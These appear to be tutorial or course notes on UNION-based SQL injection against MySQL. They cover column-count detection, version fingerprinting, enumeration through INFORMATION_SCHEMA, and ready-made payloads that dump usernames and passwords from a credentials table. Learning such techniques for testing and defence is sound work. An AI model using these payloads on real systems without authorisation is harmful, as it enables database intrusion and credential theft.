### Union Clause
Is used to combine results from multiple SELECT statements. With this, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases. 
```
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```
Some of the rows belong to the ports table while others belong to the ships table.

__Note:__ The data types of the selected columns on all positions should be the same.
### Union on Same No of Columns

A UNION statement can only operate on SELECT statements with an equal number of columns.

If we attempt to UNION two queries that have results with a different number of columns, we get an error.
```
mysql> SELECT city FROM ports UNION SELECT * FROM ships;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.
```
SELECT * FROM products WHERE product_id = ‘user_input’
```
We can inject a UNION query into the input, such that rows from another table are returned:
```
SELECT * from products where product_id = ‘1’ UNION SELECT username, password from passwords—‘
```
This would return username and password entries from the passwords table, assuming the products table has two columns.

### Un-even Columns
Suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.

We can use any string as our junk data, and the query will return the string as its output for that column. 

If we UNION with the string “junk”, the SELECT query would be SELECT “junk” from passwords, which will always return junk. 

We can also use numbers. For example, the query SELECT 1 from passwords will always return 1 as the output.

__Note:__ When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error.

__**Tip:**__ For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

So we have to UNION with two columns. If we only wanted to get one column ‘e.g. username’, we have to do username, 2, such that we have the same number of columns:
```
SELECT * from products where product_id = ‘1’ UNION SELECT username, 2 from passwords
```
If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. 
```
UNION SELECT username, 2, 3, 4 from passwords—‘
```
This would return:
```
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords—‘

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```
As we can see, our wanted output of the ‘UNION SELECT username from passwords’ query is found at the first column of the second row, while the numbers filled the remaining columns.

### Union Injections
in a search parameter, we can try to put a single quote(') and see if we get an error.
#### Detecting Number of Columns
we can use
- ORDER BY
- UNION

#### ORDER BY
We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

If we failed at order by 4, this means the table has three columns, which is the number of columns we were able to sort by successfully. 
```
' order by 1-- -
```

#### Using UNION
WE can use a Union injection with a different number of columns until we successfully get the results back.
 We can start by injecting a 3 column UNION query:
```
' UNION select 1,2,3-- -
```

While a query may return multiple columns, the web application may only display some of them.
So, if we inject our query in a column that is not printed on the page, we will not get its output.

 we can use the @@version SQL query as a test and place it in the second column instead of the number 2:
 ```
 ' UNION select 1,@@version,3,4-- -
 ```
## Database Enumeration
### Mysql Fingerprinting
__identifying the type of db__

This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.

As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. 

We can use this to verify is we are working with mysql:

### Information_Schema Database
To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
- List of databases
- List of tables within each database
- List of columns within each table

The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.

As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
```
SELECT * FROM my_database.users;
```
### Schemata (Finding Databases present)
The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server.

 It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
 
```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

The same using union:
```
UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
__NB:__ The first 3 db's are usually defaults.

We can see the database being currently used by:
```
database()
```
### Finding Tables
We can use the TABLES table in the INFORMATION_SCHEMA Database.

The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns.

The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. 

We can use the following payload to find the tables within the dev database:
```
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.

### Finding Columns
To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. 

The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this
```
UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
In this case, the username table has 2 columns;username and password.

### Dumping the Data.
Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:

```
UNION select 1, username, password, 4 from dev.credentials-- -
```
__NB:__ Don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database
